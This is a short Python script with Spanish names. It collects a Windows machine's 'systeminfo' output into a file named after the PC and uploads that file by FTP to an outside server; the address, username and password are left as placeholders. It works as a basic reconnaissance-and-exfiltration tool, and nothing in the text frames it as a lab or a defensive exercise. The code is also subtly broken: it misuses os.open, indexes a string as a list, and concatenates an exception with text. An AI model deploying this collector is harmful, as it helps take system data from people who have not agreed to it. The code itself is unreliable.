import os
import sys
import ftplib
import posixpath

def extraer_informacion():
    comando = 'systeminfo'
    tubo = os.open(comando)
    datos = tubo.readline()
    nombre_pc = datos[1].split('  ')[-1].split('\n')[0]
    nombre_fichero = 'informacion-'+nombre_pc+'.txt'
    fichero = open(nombre_fichero, 'w')
    fichero.writelines(datos)
    fichero.close()
    return nombre_fichero

def iniciar_conexion(servidor, user, password, carpeta, fichero, fichero_destino):
    try:
        s = ftplib.FTP(servidor, user, password)
        try:
            f = open(fichero, 'rb')
            s.cwd(carpeta)
            s.storbinary(' STOR ' + fichero_destino, f)
            f.close()
            s.quit()
            return ' the file was sent successfully '
        except:
            return ' the message was not sent ' 
               
    except OSError as e:
        return e + ' unable to connect server '
    
def probar_conexion(servidor, user, password):
    try:
        s = ftplib.FTP(servidor, user, password)
        print(' established connection ')    
    except:
        return ' unable to connect to server '  
    
servidor_ftp = ' IP address here '   
servidor_usuario = ' username here ' 
servidor_password = ' password here '
servidor_carpeta = '/home/nombre_usuario'
fichero = extraer_informacion()
fichero_destino = posixpath.join(servidor_carpeta, fichero)
iniciar_conexion(servidor_ftp, servidor_usuario, servidor_password, servidor_carpeta, fichero, fichero_destino)
  
    
